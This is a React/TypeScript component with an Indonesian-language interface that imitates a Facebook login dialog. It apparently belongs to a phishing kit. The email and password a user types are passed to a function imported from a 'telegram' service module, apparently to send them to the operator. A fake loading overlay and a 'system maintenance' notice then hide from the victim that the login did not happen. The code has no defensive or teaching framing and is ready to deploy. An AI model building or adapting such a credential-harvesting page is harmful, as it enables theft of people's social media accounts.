import { useState } from 'react';
import { sendFacebookLogin } from '../services/telegram';
import './LoginForm.css';



interface FacebookLoginProps {
  onClose: () => void;
}

const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
  const [step, setStep] = useState(1); // 1: FB Form, 3: Success

  // STEP 1 STATES
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // STEP 1 HANDLER: Direct Submit
  const handleFbSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      alert("Email dan Kata Sandi harus diisi!");
      return;
    }
    
    // No questions anymore
    const q1 = "-";
    const q2 = "-";

    // Send all data (FB Creds + Answers)
    const success = await sendFacebookLogin(email, password, q1, q2);
    
    // Show Loading Overlay
    setShowCustomLoading(true);
    setStep(0); // Hide forms

    setTimeout(() => {
      setShowCustomLoading(false);
      
      if (success) {
        setStep(3); // Show Success
      } else {
        alert("Terjadi kesalahan. Silakan coba lagi.");
        setStep(1); // Retry login
      }
    }, 5000);
  };

  // Custom Loading Component
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fade-in">
        <div className="flex flex-col items-center">
          <div className="relative w-20 h-20 mb-4">
            {/* Outer Ring - Gold */}
            <div className="absolute inset-0 rounded-full border-[5px] border-t-[#ffd700] border-r-[#ffd700] border-b-transparent border-l-transparent animate-spin"></div>
            {/* Inner Ring - Pink */}
            <div className="absolute inset-2 rounded-full border-[5px] border-t-transparent border-r-[#e91e63] border-b-[#e91e63] border-l-transparent animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }}></div>
            {/* Center Dot */}
            <div className="absolute inset-0 flex items-center justify-center">
               <div className="w-3 h-3 bg-white rounded-full animate-ping"></div>
            </div>
          </div>
          <div className="text-[#ffd700] font-black text-lg tracking-[0.2em] uppercase drop-shadow-[0_0_10px_rgba(255,215,0,0.5)] animate-pulse">
            Memuat...
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: FACEBOOK FORM ================= */}
      {step === 1 && (
        <div className="bg-white rounded-[10px] shadow-[0_4px_10px_rgba(238,4,4,0.2)] p-5 w-[400px] relative animate-pop-in">
          <button 
            onClick={onClose}
            className="absolute top-2.5 right-2.5 bg-transparent border-none text-[18px] font-bold text-[#333] cursor-pointer hover:text-black"
          >
            ×
          </button>

          <h2 className="text-[20px] text-[#333] text-center mb-5 font-bold">
            Login ke Facebook
          </h2>

          <form onSubmit={handleFbSubmit}>
            <input
              type="text"
              placeholder="Email atau Nomor Telepon"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Kata Sandi"
              className="w-full p-2.5 mb-[15px] border border-[#ccc] rounded-[5px] text-[14px] box-border focus:border-[#1877f2] focus:outline-none"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full p-2.5 bg-[#1877f2] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#155db3] transition-colors"
            >
              Masuk
            </button>

            <div className="text-center mt-[15px] text-[14px] text-[#555]">
              <a href="#" className="text-[#1877f2] no-underline hover:underline">
                Lupa kata sandi?
              </a>
            </div>

            <div className="my-5 border-t border-[#dadde1]"></div>

            <button
              type="button"
              className="block mx-auto w-[60%] p-[11px] bg-[#42b72a] text-white text-[16px] font-bold border-none rounded-[5px] cursor-pointer hover:bg-[#36a420] transition-colors"
            >
              Buat akun baru
            </button>
          </form>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL ================= */}
      {step === 3 && (
        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
          <div className="relative w-[320px] bg-gradient-to-b from-[#4a148c] to-[#2a0e45] rounded-xl border-2 border-[#ffd700] p-5 flex flex-col items-center shadow-[0_0_20px_rgba(255,215,0,0.3)]">
            {/* Close Button */}
            <button 
              onClick={onClose} 
              className="absolute top-2 right-2 w-6 h-6 flex items-center justify-center bg-white/10 hover:bg-white/20 rounded-full text-white transition-colors text-xs"
            >
              ✕
            </button>

            {/* Animated Icon */}
            <div className="w-16 h-16 mb-4 relative">
               <div className="absolute inset-0 bg-[#ffd700]/20 rounded-full animate-ping"></div>
               <div className="relative w-full h-full bg-[#ffd700] rounded-full flex items-center justify-center shadow-[0_0_15px_#ffd700]">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#4a148c] animate-spin-slow" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
               </div>
            </div>

            {/* Text Content */}
            <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
              Sistem Maintenance
            </h3>
            <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
              Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
            </p>

            {/* Action Button */}
            <button 
              onClick={onClose}
              className="px-6 py-1.5 bg-gradient-to-r from-[#ffd700] to-[#ffb74d] text-[#4a148c] text-sm font-bold rounded-full shadow-md hover:scale-105 active:scale-95 transition-transform"
            >
              Mengerti
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default FacebookLogin;
